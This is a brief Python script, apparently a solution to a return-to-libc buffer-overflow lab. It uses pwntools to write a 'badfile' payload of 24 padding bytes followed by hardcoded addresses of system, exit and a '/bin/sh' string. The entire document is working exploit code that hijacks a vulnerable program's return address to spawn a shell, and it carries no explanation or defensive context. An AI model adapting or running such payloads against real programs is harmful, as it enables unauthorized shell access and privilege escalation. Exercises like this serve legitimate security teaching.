import os
os.environ['PWNLIB_NOTERM'] = 'True'
from pwn import *

system = 0xb7da4da0
binsh = 0xb7ec582b
exit = 0xb7d989d0

with open('badfile', 'wb') as f:
    f.write(b'A' * 24 + p32(system) + p32(exit) + p32(binsh))
